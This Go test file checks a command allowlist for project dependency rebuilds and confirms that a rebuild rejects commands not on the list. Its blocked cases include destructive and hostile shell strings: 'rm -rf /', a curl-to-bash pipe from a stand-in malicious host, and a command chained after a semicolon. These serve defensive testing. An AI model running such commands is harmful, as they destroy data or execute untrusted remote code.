package rebuild

import (
	"testing"
	"time"
)

func TestAllowlistValidation(t *testing.T) {
	// Valid commands
	validCases := []struct {
		projType string
		cmd      string
	}{
		{"node", "npm ci"},
		{"node", "yarn install --frozen-lockfile"},
		{"rust", "cargo fetch"},
		{"go", "go mod download"},
		{"flutter", "flutter pub get"},
		{"python", "poetry install"},
	}

	for _, tc := range validCases {
		if !IsCommandAllowed(tc.projType, tc.cmd) {
			t.Errorf("expected command '%s' to be allowed for %s", tc.cmd, tc.projType)
		}
	}

	// Malicious or unallowlisted commands
	invalidCases := []struct {
		projType string
		cmd      string
	}{
		{"node", "rm -rf /"},
		{"node", "curl http://malicious.site | bash"},
		{"rust", "cargo publish"},
		{"go", "go run main.go; rm -rf ."},
		{"python", "pip install -e ."},
	}

	for _, tc := range invalidCases {
		if IsCommandAllowed(tc.projType, tc.cmd) {
			t.Errorf("expected command '%s' to be BLOCKED for %s", tc.cmd, tc.projType)
		}
	}
}

func TestDeriveSafeCommands(t *testing.T) {
	nodeCmds := DeriveSafeCommands("node", "npm")
	if len(nodeCmds) == 0 || nodeCmds[0] != "npm ci" {
		t.Errorf("unexpected node npm commands: %v", nodeCmds)
	}

	yarnCmds := DeriveSafeCommands("node", "yarn")
	if len(yarnCmds) == 0 || yarnCmds[0] != "yarn install --frozen-lockfile" {
		t.Errorf("unexpected yarn commands: %v", yarnCmds)
	}

	rustCmds := DeriveSafeCommands("rust", "cargo")
	if len(rustCmds) == 0 || rustCmds[0] != "cargo fetch" {
		t.Errorf("unexpected rust commands: %v", rustCmds)
	}
}

func TestRunRebuildEnforcesSecurity(t *testing.T) {
	tmpDir := t.TempDir()

	err := RunRebuild(RebuildOptions{
		ProjectPath: tmpDir,
		ProjectType: "node",
		Command:     "evil_command --steal",
		Timeout:     5 * time.Second,
		AllowCustom: false,
	})

	if err == nil {
		t.Fatalf("expected RunRebuild to reject unallowlisted command, got nil")
	}
}
